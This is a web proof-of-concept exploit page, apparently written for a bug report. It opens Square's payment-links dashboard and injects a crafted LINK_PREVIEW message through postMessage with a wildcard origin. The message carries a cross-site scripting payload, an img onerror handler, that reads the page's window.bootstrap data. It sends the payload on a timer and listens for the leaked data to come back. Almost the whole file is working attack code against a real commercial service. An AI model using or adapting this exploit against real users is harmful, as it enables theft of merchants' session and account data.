<!DOCTYPE html>
<html>
<head>
  <title>PoC - Bootstrap Leak via postMessage</title>
</head>
<body>
  <button onclick="sendPayload()">Send Payload</button>

  <script>
    // Open the Square dashboard in a new window
    const w = window.open('https://app.squareup.com/dashboard/payment-links/new');

    // Payload that gets injected into the target window via postMessage
    const payload = {
      name: 'LINK_PREVIEW',
      data: {
        type: 'INITIALIZE',
        uuid: 'x',
        data: {
          checkout_link: {
            id: 'l',
            link_type: 'ITEM_LINK',
            checkout_link_data: {
              name: 'P',
              link_type: 'ITEM_LINK',
              order_details: {
                line_items: [
                  {
                    item_id: 'i',
                    quantity: { quantity: 1 }
                  }
                ]
              }
            }
          },
          related_objects: [
            {
              type: 'ITEM',
              id: 'i',
              item_data: {
                name: 'HACKED',
                description_html: '',
                description: `<img src=x onerror="alert(JSON.stringify(window.bootstrap));">`,
                variations: [
                  {
                    type: 'ITEM_VARIATION',
                    id: 'v',
                    item_variation_data: {
                      item_id: 'i',
                      name: 'D',
                      pricing_type: 'FIXED_PRICING',
                      price_money: { amount: 100, currency: 'USD' }
                    }
                  }
                ]
              }
            }
          ],
          settings: {
            checkout_title: 'HACKED'
          }
        }
      }
    };

    // Send the payload via postMessage
    function sendPayload() {
      if (!w || w.closed) {
        alert("Target window is not open.");
        return;
      }

      for (let i = 0; i < 10; i++) {
        try {
          w.frames[i].postMessage(payload, '*');
        } catch (e) {}
      }

      console.log('Payload sent');
    }

    // Receive the data back from the target window
    window.addEventListener('message', event => {
      if (event.data && event.data.leaked) {
        console.log('[âœ“] Received window.bootstrap from target:', JSON.parse(event.data.leaked));
        alert('Got bootstrap data! Check console.');
      }
    });

    // Automatically send payload after 5 seconds
    setTimeout(sendPayload, 5000);
  </script>
</body>
</html>
